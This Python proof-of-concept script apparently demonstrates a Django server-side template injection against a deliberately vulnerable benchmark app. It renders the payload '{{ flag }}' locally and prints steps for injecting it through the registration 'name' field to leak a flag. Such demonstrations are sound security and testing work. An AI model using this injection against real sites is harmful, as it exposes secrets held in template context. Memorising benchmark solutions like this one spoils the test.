#!/usr/bin/env python3
"""
POC for SSTI vulnerability - Flag Extraction
Demonstrates how an attacker can steal the flag variable from the template context
"""

import os
os.chdir('/home/daytona/repo/app/ssti_debug_art_gallery')

# Setup Django
import django
from django.conf import settings

if not settings.configured:
    settings.configure(
        DEBUG=True,
        SECRET_KEY='test',
        TEMPLATES=[{
            'BACKEND': 'django.template.backends.django.DjangoTemplates',
            'DIRS': [],
        }],
    )

django.setup()

from django.template import Template, Context

print("="*70)
print("SSTI FLAG EXTRACTION POC")
print("="*70)

# Payload to extract the flag from context
payload = '{{ flag }}'

# Simulate the vulnerable template rendering
# This is what happens in register_step3:
# template_content = open('...register_step3.html').read()
# template_content.replace('ACCOUNTNAME', request.session['name'])  <- SSTI injection here
# template.render({'flag': flag}, request)

test_template = f'User: {payload}'
flag_value = 'XBEN-025-24-testing-flag'

print(f"\nAttacker Payload: {payload}")
print(f"Injected via: request.session['name']")
print(f"Template becomes: User: {payload}")
print(f"Flag in context: flag='{flag_value}'")

# Compile and render with the flag in context
template_obj = Template(test_template)
rendered = template_obj.render(Context({'flag': flag_value}))

print(f"\nRendered Output: {rendered}")

if flag_value in rendered:
    print("\n" + "="*70)
    print("✓✓✓ SSTI FLAG EXTRACTION SUCCESSFUL!")
    print("="*70)
    print(f"Attacker successfully extracted the flag: {flag_value}")
    print("\nAttack vector:")
    print("1. Navigate to /accounts/register/step1/")
    print("2. Enter SSTI payload in 'name' field: {{ flag }}")
    print("3. Complete registration steps 2 and 3")
    print("4. The flag appears in the HTML output")
